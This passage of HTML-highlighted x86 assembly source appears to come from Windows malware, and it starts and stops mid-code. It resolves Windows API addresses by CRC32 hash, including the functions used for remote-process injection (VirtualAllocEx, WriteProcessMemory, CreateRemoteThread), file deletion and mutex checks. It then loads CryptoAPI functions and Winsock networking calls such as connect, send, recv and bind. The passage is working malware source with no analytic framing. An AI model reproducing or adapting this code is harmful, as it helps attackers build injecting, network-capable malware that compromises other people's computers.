    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00E9BBAD5h</span><span class="sc0">      </span><span class="sc1">;WriteProcessMemory</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0CF4A7F65h</span><span class="sc0">      </span><span class="sc1">;CreateRemoteThread</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0700ED6DFh</span><span class="sc0">      </span><span class="sc1">;VirtualFreeEx</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0C6F22166h</span><span class="sc0">      </span><span class="sc1">;OpenMutexA</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">020B943E7h</span><span class="sc0">      </span><span class="sc1">;CreateMutexA</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00AC136BAh</span><span class="sc0">      </span><span class="sc1">;Sleep</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">079C3D4BBh</span><span class="sc0">      </span><span class="sc1">;VirtualProtect</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0058F9201h</span><span class="sc0">      </span><span class="sc1">;ExitThread</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">02AAD1211h</span><span class="sc0">      </span><span class="sc1">;VirtualFree</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">004DCF392h</span><span class="sc0">      </span><span class="sc1">;GetModuleFileNameA</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0DE256FDEh</span><span class="sc0">      </span><span class="sc1">;DeleteFileA</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">082B618D4h</span><span class="sc0">      </span><span class="sc1">;GetModuleHandleA</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">04402890Eh</span><span class="sc0">      </span><span class="sc1">;VirtualAlloc</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0E141042Ah</span><span class="sc0">      </span><span class="sc1">;GetProcessHeap</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">019F33607h</span><span class="sc0">      </span><span class="sc1">;CreateThread</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0D4540229h</span><span class="sc0">      </span><span class="sc1">;WaitForSingleObject</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0613FD7BAh</span><span class="sc0">      </span><span class="sc1">;GetTickCount</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0593AE7CEh</span><span class="sc0">      </span><span class="sc1">;GetSystemDirectoryA</span><span class="sc0">

</span><span class="sc5">n_apiz</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">s_apiz</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">@callz</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">c_look</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">+(</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;is it our API?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">got_call</span><span class="sc0">        </span><span class="sc1">;yeah</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">c_look</span><span class="sc0">          </span><span class="sc1">;nope, look for another API in our table</span><span class="sc0">
</span><span class="sc5">c_out</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">c_over</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">c_find</span><span class="sc0">
</span><span class="sc5">c_over</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">got_call</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebx.ED_AddressOfOrdinals</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">esp.Pushad_esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebx.ED_AddressOfFunctions</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">api_addr</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">c_out</span><span class="sc0">
</span><span class="sc5">get_apiz</span><span class="sc0">    </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc5">api_addr</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;where to save addresses of APIz...</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_LoadLibraryA</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_FreeLibrary</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_GetProcAddress</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_OpenProcess</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_VirtualAllocEx</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_WriteProcessMemory</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_CreateRemoteThread</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_VirtualFreeEx</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_OpenMutexA</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_CreateMutexA</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_Sleep</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_VirtualProtect</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_ExitThread</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_VirtualFree</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_GetModuleFileNameA</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_DeleteFileA</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_GetModuleHandleA</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_VirtualAlloc</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_GetProcessHeap</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_CreateThread</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_WaitForSingleObject</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_GetTickCount</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_GetSystemDirectoryA</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">



</span><span class="sc1">;procedure for calculating CRC32s at run-time</span><span class="sc0">

</span><span class="sc5">CRC32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">   
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">   
</span><span class="sc5">NextByteCRC</span><span class="sc4">:</span><span class="sc0">           
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">   
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">   
        </span><span class="sc6">lodsb</span><span class="sc0">          
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">     
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">NextBitCRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">NoCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">08320h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0EDB8h</span><span class="sc0">
</span><span class="sc5">NoCRC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NextBitCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NextByteCRC</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">






</span><span class="sc1">;retrieves all needed API addresses from ADVAPI32.dll</span><span class="sc0">

</span><span class="sc5">crypt32_apiz</span><span class="sc0">    </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'ADVAPI32'</span><span class="sc0">      </span><span class="sc1">;get address of ADVAPI32 .dll</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GetModuleHandleA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;to EBX</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'CryptAcquireContextA'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CryptAcquireContextA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;save API address</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'CryptGenKey'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CryptGenKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;--- " " ---</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'CryptDestroyKey'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CryptDestroyKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;--- " " ---</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'CryptImportKey'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CryptImportKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;--- " " ---</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'CryptExportKey'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CryptExportKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;--- " " ---</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'CryptEncrypt'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CryptEncrypt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;--- " " ---</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'CryptDecrypt'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CryptDecrypt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;--- " " ---</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'CryptReleaseContext'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CryptReleaseContext</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;--- " " ---</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">crypt32_apiz</span><span class="sc0">    </span><span class="sc9">EndP</span><span class="sc0">



</span><span class="sc1">;retrieves all needed API addresses from WSOCK32.dll</span><span class="sc0">

</span><span class="sc5">wsock32_api</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'WSOCK32'</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_LoadLibraryA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;load WSOCK32.dll</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_wsock32</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'WSAStartup'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_WSAStartup</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;save API address</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'socket'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_socket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;--- " " ---</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'connect'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_connect</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;--- " " ---</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'recv'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_recv</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;--- " " ---</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'send'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_send</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;--- " " ---</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'bind'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
